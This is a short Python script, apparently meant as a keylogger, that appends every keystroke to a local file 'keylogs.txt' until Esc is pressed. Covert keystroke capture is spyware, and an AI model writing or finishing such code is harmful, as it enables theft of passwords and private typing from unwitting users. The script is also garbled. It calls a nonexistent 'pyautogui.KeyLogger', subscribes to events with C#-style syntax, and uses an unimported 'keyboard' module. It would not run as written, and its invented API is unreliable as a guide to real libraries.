import pyautogui

keylog_file = open('keylogs.txt', 'a')

listener = pyautogui.KeyLogger()

def log_keystroke(key):
    if key.isprintable():
        keylog_file.write(key)
    else:
        keylog_file.write('[{}]'.format(key))

listener.Key.press_event += log_keystroke

try:
    listener.start()
    while True:
        if keyboard.is_pressed('esc'):
            break
finally:
    listener.stop()
    keylog_file.close()
